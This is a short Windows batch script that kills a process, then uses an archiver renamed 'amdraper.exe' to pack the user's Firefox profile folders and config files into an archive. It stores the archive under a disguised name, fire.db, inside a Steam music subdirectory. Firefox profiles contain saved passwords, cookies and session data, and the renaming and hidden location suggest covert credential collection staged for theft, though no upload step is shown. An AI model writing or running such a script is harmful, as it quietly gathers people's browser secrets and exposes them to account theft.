@echo off
echo Firefox Data will be saved
taskkill /f /im icefox.exe
cd "C:\Program Files (x86)\Steam\music\_database"
%localappdata%\WinRAR\amdraper.exe a -ep1 fire.rar %AppData%\Mozilla\Firefox\installs.ini %AppData%\Mozilla\Firefox\profiles.ini %AppData%\Mozilla\Firefox\Profiles
del fire.db
ren fire.rar fire.db
exit